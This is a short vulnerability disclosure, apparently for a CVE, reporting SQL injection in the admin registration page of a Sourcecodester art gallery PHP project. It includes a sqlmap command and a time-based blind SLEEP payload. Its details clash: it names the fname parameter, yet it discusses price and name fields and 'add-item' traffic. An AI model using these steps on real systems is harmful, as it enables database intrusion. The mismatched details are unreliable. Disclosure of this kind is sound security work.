# SQL Injection vulnerability was discovered in Sourcecodester Online Art Gallary Management System 1.0 (admin registration)

Affected Project: Sourcecodester Online Art Gallary Management System 1.0

Official Website: https://www.sourcecodester.com/php/14211/online-art-gallery-management-system-project-using-phpmysql.html

Version: 1.0

Related Code file: /Admin/registration.php

Injection parameter: fname


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The price and name fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the /Admin/ By clicking on **Registration**, we can register for admin account.

`http://192.168.12.147/Admin/registration.php`

![image](https://github.com/gurudattch/CVEs/blob/main/assets/0.png)

--- 

We will first intercept the add-item traffic using Burp Suite
![image1](https://github.com/gurudattch/CVEs/blob/main/assets/1.png)

 ---
 
Save the intercepted Registration request to a .txt file and execute sqlmap towards it. 

![image1](https://github.com/gurudattch/CVEs/blob/main/assets/2.png)


---

parameter fname is vulnerable to sql injection

Below commands verifies the vulnerability:

`sqlmap -r sqli_test.txt -p fname`

---

![image3](https://github.com/gurudattch/CVEs/blob/main/assets/3.png)

---

```
---
Parameter: fname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=asdafsd&price=123 AND (SELECT 1175 FROM (SELECT(SLEEP(5)))jrgF)&action=
---
```
